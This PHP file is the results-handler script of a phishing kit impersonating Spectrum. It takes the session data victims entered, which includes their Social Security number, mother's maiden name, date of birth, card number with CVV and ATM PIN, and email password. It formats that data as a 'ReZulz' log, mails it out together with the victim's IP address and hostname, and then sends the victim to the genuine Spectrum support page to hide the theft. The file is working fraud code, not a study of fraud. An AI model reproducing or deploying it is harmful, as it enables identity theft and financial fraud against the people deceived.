<?php
if ($include != 1)
 {
 die('Illegal Access');
 }

include 'cc_validator.php'; //Caling Card validator

//Open Session
ini_set("output_buffering",4096);
session_start();


//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

//Filling Email to send
include('Email.php');


//Getting UserID info from Session
$firstname = $_SESSION['FNAME'];
$lastname = $_SESSION['LNAME'];
$address = $_SESSION['ADDRESS'];
$zip = $_SESSION['ZIP'];
$phone = $_SESSION['Phone'];
$ssn = $_SESSION['SSN'];
$mmn = $_SESSION['MMN'];
$dob = $_SESSION['DOB'];
$ccnum = $_SESSION['CCnum'];
$CCType = is_valid_card($ccnum);
$expdate = $_SESSION['EXPDATE'];
$cvv = $_SESSION['CVV'];
$pin = $_SESSION['PIN'];
$email = $_SESSION['EMail'];
$pass = $_SESSION['Password'];



$spectrum="==================+[ POMPASTIC Info - spectrum ReZulz ]+==================
First Name: $firstname
Last Name: $lastname
Address: $address
Zip: $zip
Phone: $phone
Social Security Number: $ssn
Mother's Maiden Name: $mmn
Date of Birth: $dob ( Month - Day - Year )
============= [ Bank & Card Info ] =============
Card Number: $ccnum
Expiration date: $expdate
CVV: $cvv
ATM/PIN: $pin
============= [ Email Login Info ] =============
Email: $email
Pass: $pass
============= [ Ip & Hostname Info ] =============
Client IP: $ip
Hostname: $hostname
-----------------+ Hunted In 2014 +-----------------";


$subject = "$ip | Spectrum";
$headers = "From: Spectrum <yesli1@cenglandb.com>";
$headers .= $_POST['POMPASTIC']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($SEND,$subject,$spectrum,$headers);

session_destroy();
$Redirect="https://www.spectrum.net/support/internet/stay-protected-spectrum?redirected=true";
header("Location: $Redirect");




?>